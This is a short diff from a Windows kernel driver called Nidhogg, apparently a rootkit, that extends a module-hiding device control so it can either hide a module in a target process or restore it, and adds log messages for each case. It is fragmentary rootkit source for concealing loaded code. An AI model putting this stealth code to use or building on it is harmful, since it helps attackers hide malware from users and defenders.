@@ -728,7 +728,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		break;
 	}
 
-	case IOCTL_HIDE_MODULE:
+	case IOCTL_HIDE_RESTORE_MODULE:
 	{
 		HiddenModuleInformation hiddenModule{};
 
@@ -759,12 +759,20 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		status = NidhoggMemoryHandler->HideModule(&hiddenModule);
+
+		if (hiddenModule.Hide)
+			status = NidhoggMemoryHandler->HideModule(&hiddenModule);
+		else
+			status = NidhoggMemoryHandler->RestoreModule(&hiddenModule);
 
 		if (NT_SUCCESS(status)) {
 			auto prevIrql = KeGetCurrentIrql();
 			KeLowerIrql(PASSIVE_LEVEL);
-			Print(DRIVER_PREFIX "Hid module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
+
+			if (hiddenModule.Hide)
+				Print(DRIVER_PREFIX "Hid module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
+			else
+				Print(DRIVER_PREFIX "Restored module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
 			KeRaiseIrql(prevIrql, &prevIrql);
 		}
 
